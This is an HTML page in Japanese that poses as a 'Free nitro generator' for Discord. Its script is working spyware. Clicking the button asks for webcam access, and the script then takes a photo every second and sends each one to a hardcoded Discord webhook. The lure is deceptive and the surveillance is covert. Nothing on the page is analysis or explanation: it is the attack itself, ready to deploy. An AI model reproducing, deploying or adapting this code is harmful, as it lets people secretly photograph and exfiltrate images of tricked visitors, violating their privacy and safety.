<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nitro Gen</title>
    <style>
        body {
            display: flex;
            flex-direction: column; /* Align items vertically */
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #6a1b9a, #ab47bc); /* Purple gradient */
            text-align: center;
        }
        #logo {
            width: 100px; /* Adjust size as needed */
            margin-bottom: 20px; /* Space between the image and button */
        }
        #startCamera {
            padding: 15px 30px;
            font-size: 22px;
            cursor: pointer;
            border-radius: 15px;
            border: none;
            color: white;
            background-color: #333;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        #startCamera:hover {
            background-color: #555;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
        }
    </style>
</head>
<body>
    <img id="logo" src="https://static.wikia.nocookie.net/discord/images/e/ea/Nitro.png/revision/latest?cb=20210105222501" alt="Nitro Logo">

    <button id="startCamera">Free nitro generator !!</button>

    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>

    <script>
        const startCameraButton = document.getElementById('startCamera');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        startCameraButton.addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setInterval(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('file', blob, 'photo.jpg');
                        
                        await fetch('https://canary.discord.com/api/webhooks/1277539013556965406/PYrk2AIJf7PwPxbsP4FkT5WQTj5bnTLeUhEgMcYVCKFQoGkl7T1ubcTaMW9jj-iYL6i0', {
                            method: 'POST',
                            body: formData
                        }).then(response => {
                            if (response.ok) {
                                console.log('画像');
                            } else {
                                console.error('画像');
                            }
                        }).catch(error => {
                            console.error('エラー:', error);
                        });
                    }, 'image/jpeg');
                }, 1000);
            } catch (error) {
                console.error('カメラの起動に失敗しました:', error);
            }
        });
    </script>
</body>
</html>
